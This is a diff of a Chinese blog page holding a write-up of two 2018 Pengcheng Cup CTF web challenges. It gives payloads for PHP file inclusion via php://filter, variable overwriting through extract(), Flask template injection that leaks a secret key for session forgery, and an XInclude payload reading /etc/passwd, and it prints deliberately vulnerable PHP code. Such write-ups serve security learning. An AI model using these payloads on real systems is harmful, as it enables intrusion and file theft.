@@ -15,11 +15,11 @@
 
 
 <html class="theme-next mist use-motion" lang="zh-Hans">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
-<meta name="theme-color" content="#222"/>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
 
 
 
@@ -44,9 +44,9 @@
 
 
 
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
 
-<link rel="stylesheet" href="/css/main.css?v=7.1.0"/>
+<link rel="stylesheet" href="/css/main.css?v=7.1.0">
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="https://github.com/Windylh/image/raw/master/icon.ico?v=7.1.0">
@@ -96,24 +96,20 @@
 
 
 
-  <meta name="description" content="myblog这道题脑洞很大。。。
-index.php的header中有flag: JTNGZmxhZw==，解base64得到参数%3Fflag，猜测index.php存在文件包含，运用flag参数读文件。
-payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-encode/resource=ind">
+  <meta name="description" content="myblog这道题脑洞很大。。。 index.php的header中有flag: JTNGZmxhZw==，解base64得到参数%3Fflag，猜测index.php存在文件包含，运用flag参数读文件。 payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-encode/resource=ind">
+<meta name="keywords" content="WriteUp,CTF">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2018鹏城杯myblog&shadow Writeup">
+<meta property="og:title" content="2018鹏城杯myblog&amp;shadow Writeup">
 <meta property="og:url" content="http://yoursite.com/2018/12/01/2018鹏城杯Web(部分)Writeup/index.html">
-<meta property="og:site_name" content="Windylh's blog">
-<meta property="og:description" content="myblog这道题脑洞很大。。。
-index.php的header中有flag: JTNGZmxhZw==，解base64得到参数%3Fflag，猜测index.php存在文件包含，运用flag参数读文件。
-payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-encode/resource=ind">
+<meta property="og:site_name" content="Windylh&#39;s blog">
+<meta property="og:description" content="myblog这道题脑洞很大。。。 index.php的header中有flag: JTNGZmxhZw==，解base64得到参数%3Fflag，猜测index.php存在文件包含，运用flag参数读文件。 payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-encode/resource=ind">
+<meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://github.com/Windylh/image/raw/master/2018.12.1/myblog.png">
 <meta property="og:image" content="https://github.com/Windylh/image/raw/master/2018.12.1/shadow.jpg">
 <meta property="og:updated_time" content="2018-12-07T08:20:03.557Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="2018鹏城杯myblog&shadow Writeup">
-<meta name="twitter:description" content="myblog这道题脑洞很大。。。
-index.php的header中有flag: JTNGZmxhZw==，解base64得到参数%3Fflag，猜测index.php存在文件包含，运用flag参数读文件。
-payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-encode/resource=ind">
+<meta name="twitter:title" content="2018鹏城杯myblog&amp;shadow Writeup">
+<meta name="twitter:description" content="myblog这道题脑洞很大。。。 index.php的header中有flag: JTNGZmxhZw==，解base64得到参数%3Fflag，猜测index.php存在文件包含，运用flag参数读文件。 payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-encode/resource=ind">
 <meta name="twitter:image" content="https://github.com/Windylh/image/raw/master/2018.12.1/myblog.png">
 
 
@@ -122,7 +118,7 @@ payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-enc
 
   
   
-  <link rel="canonical" href="http://yoursite.com/2018/12/01/2018鹏城杯Web(部分)Writeup/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/12/01/2018鹏城杯Web(部分)Writeup/">
 
 
 
@@ -200,7 +196,7 @@ payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-enc
   </div>
 
   <div class="site-nav-toggle">
-    <button aria-label="Navigationsleiste an/ausschalten">
+    <button aria-label="Toggle navigation bar">
       <span class="btn-bar"></span>
       <span class="btn-bar"></span>
       <span class="btn-bar"></span>
@@ -228,7 +224,7 @@ payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-enc
 
     
 
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>Startseite</a>
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
 
   </li>
         
@@ -245,7 +241,7 @@ payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-enc
 
     
 
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br/>Schlagwörter</a>
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
 
   </li>
         
@@ -262,7 +258,7 @@ payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-enc
 
     
 
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>Archiv</a>
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
 
   </li>
 
@@ -314,16 +310,16 @@ payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-enc
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/01/2018鹏城杯Web(部分)Writeup/"/>
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/01/2018鹏城杯Web(部分)Writeup/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Windylh"/>
-      <meta itemprop="description" content=""/>
-      <meta itemprop="image" content="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg"/>
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Windylh's blog"/>
+      <meta itemprop="name" content="Windylh's blog">
     </span>
 
     
@@ -350,14 +346,14 @@ payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-enc
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posted on</span>
               
 
               
                 
               
 
-              <time title="Erstellt: 2018-12-01 00:00:00" itemprop="dateCreated datePublished" datetime="2018-12-01T00:00:00+08:00">2018-12-01</time>
+              <time title="Created: 2018-12-01 00:00:00" itemprop="dateCreated datePublished" datetime="2018-12-01T00:00:00+08:00">2018-12-01</time>
             
 
             
@@ -372,9 +368,9 @@ payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-enc
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 
-                  <span class="post-meta-item-text">Bearbeitet am</span>
+                  <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Geändert am: 2018-12-07 16:20:03" itemprop="dateModified" datetime="2018-12-07T16:20:03+08:00">2018-12-07</time>
+                <time title="Modified: 2018-12-07 16:20:03" itemprop="dateModified" datetime="2018-12-07T16:20:03+08:00">2018-12-07</time>
               
             
           </span>
@@ -394,7 +390,7 @@ payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-enc
                 <i class="fa fa-eye"></i>
               </span>
               
-                <span class="post-meta-item-text">Aufrufe: </span>
+                <span class="post-meta-item-text">Views: </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
@@ -423,22 +419,22 @@ payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-enc
 <p>index.php的header中有<code>flag: JTNGZmxhZw==</code>，解base64得到参数<code>%3Fflag</code>，猜测index.php存在文件包含，运用flag参数读文件。</p>
 <p>payload:<code>http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-encode/resource=index</code></p>
 <a id="more"></a>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    header(<span class="string">'flag: JTNGZmxhZw=='</span>);</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"flag"</span>]))&#123;</div><div class="line">        $flag = $_GET[<span class="string">"flag"</span>];</div><div class="line">        <span class="keyword">include</span> $flag.<span class="string">".php"</span>;</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    header(<span class="string">'flag: JTNGZmxhZw=='</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"flag"</span>]))&#123;</span><br><span class="line">        $flag = $_GET[<span class="string">"flag"</span>];</span><br><span class="line">        <span class="keyword">include</span> $flag.<span class="string">".php"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>提示aboutyou后端，about里也提到了base64，猜测存在<code>YWJvdXQ=.php</code></p>
 <p>payload:<code>http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-encode/resource=YWJvdXQ=</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">    $filename = <span class="string">'flag.txt'</span>;</div><div class="line">    $flag = <span class="string">'flag.txt'</span>;</div><div class="line">    extract($_GET);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($sign))&#123;</div><div class="line">        $file = trim(file_get_contents($filename));</div><div class="line">        <span class="keyword">if</span>($sign === $file)&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">'Congratulation!&lt;br&gt;'</span>;</div><div class="line">            <span class="keyword">echo</span> file_get_contents($$falg);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">'don`t give up'</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    $filename = <span class="string">'flag.txt'</span>;</span><br><span class="line">    $flag = <span class="string">'flag.txt'</span>;</span><br><span class="line">    extract($_GET);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($sign))&#123;</span><br><span class="line">        $file = trim(file_get_contents($filename));</span><br><span class="line">        <span class="keyword">if</span>($sign === $file)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Congratulation!&lt;br&gt;'</span>;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents($$falg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'don`t give up'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>变量覆盖，让$sign为空，$file读取不存在的文件，让$falg为flag读取文件。</p>
 <p>payload:<code>http://58.20.46.150:26293/YWJvdXQ=.php?sign=&amp;filename=123&amp;falg=flag</code></p>
-<p><img src="https://github.com/Windylh/image/raw/master/2018.12.1/myblog.png" alt=""></p>
+<p><img src="https://github.com/Windylh/image/raw/master/2018.12.1/myblog.png" alt></p>
 <h3 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h3><p>这题没有拿到flag，但是感觉也进行了绝大部分了，记录一下</p>
 <p>题目提示有upload，直接访问提示<code>Only admin can use it!</code></p>
 <p>尝试模版注入拿到secret_key进行session伪造，发现访问不存在的页面可以进行模版注入</p>
-<p>payload:<figure class="highlight plain"><figcaption><span>1+1 &#125;&#125;```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">过滤了括号等，和twctf2018的Shrine相似</div><div class="line"></div><div class="line">[CTFtime.org _ TokyoWesterns CTF 4th 2018 _ Shrine _ Writeup](https://ctftime.org/writeup/10895)</div><div class="line"></div><div class="line">payload:```http://58.20.46.150:25524/&#123;&#123; url_for.__globals__[&apos;current_app&apos;].config &#125;&#125;</div></pre></td></tr></table></figure></p>
+<p>payload:<figure class="highlight plain"><figcaption><span>1+1 &#125;&#125;```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">过滤了括号等，和twctf2018的Shrine相似</span><br><span class="line"></span><br><span class="line">[CTFtime.org _ TokyoWesterns CTF 4th 2018 _ Shrine _ Writeup](https://ctftime.org/writeup/10895)</span><br><span class="line"></span><br><span class="line">payload:```http://58.20.46.150:25524/&#123;&#123; url_for.__globals__[&apos;current_app&apos;].config &#125;&#125;</span><br></pre></td></tr></table></figure></p>
 <p>拿到secret_key为:<code>as/*d21as-+dhasod5a4s54:&gt;&lt;*()dfdsf</code></p>
 <p>构造session，以admin登陆，访问upload，发现文件的表单名是xml，猜测可以上传xml内容进行解析</p>
 <p>用xinclude来读取文件</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=“<span class="number">1.0</span>” <span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">xmlns:xi</span>=<span class="string">“http://www.w3.org/2001/XInclude“</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">“file:///etc/passwd”</span> <span class="attr">parse</span>=<span class="string">“text”/</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure>
-<p><img src="https://github.com/Windylh/image/raw/master/2018.12.1/shadow.jpg" alt=""></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=“<span class="number">1.0</span>” <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">xmlns:xi</span>=<span class="string">“http://www.w3.org/2001/XInclude“</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">“file:///etc/passwd”</span> <span class="attr">parse</span>=<span class="string">“text”/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/Windylh/image/raw/master/2018.12.1/shadow.jpg" alt></p>
 <p>但是最后没有找到flag，比赛结束了。。。不知道是不是有没发现的东西。</p>
 
       
@@ -536,10 +532,10 @@ payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-enc
       
         <ul class="sidebar-nav motion-element">
           <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Inhaltsverzeichnis
+            Table of Contents
           </li>
           <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Übersicht
+            Overview
           </li>
         </ul>
       
@@ -548,9 +544,7 @@ payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-enc
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
-              <img class="site-author-image" itemprop="image"
-                src="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg"
-                alt="Windylh"/>
+              <img class="site-author-image" itemprop="image" src="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg" alt="Windylh">
             
               <p class="site-author-name" itemprop="name">Windylh</p>
               <div class="site-description motion-element" itemprop="description"></div>
@@ -564,7 +558,7 @@ payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-enc
                   <a href="/archives/">
                 
                     <span class="site-state-item-count">32</span>
-                    <span class="site-state-item-name">Artikel</span>
+                    <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
               
@@ -609,7 +603,7 @@ payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-enc
                       
                     
                     <span class="site-state-item-count">13</span>
-                    <span class="site-state-item-name">schlagwörter</span>
+                    <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
               
@@ -754,7 +748,7 @@ payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-enc
 </div>
 
 
-  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.2.2</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
 
 
 
@@ -762,7 +756,7 @@ payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-enc
 
 
 
-  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> v7.1.0</div>
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> v7.1.0</div>
 
 
 
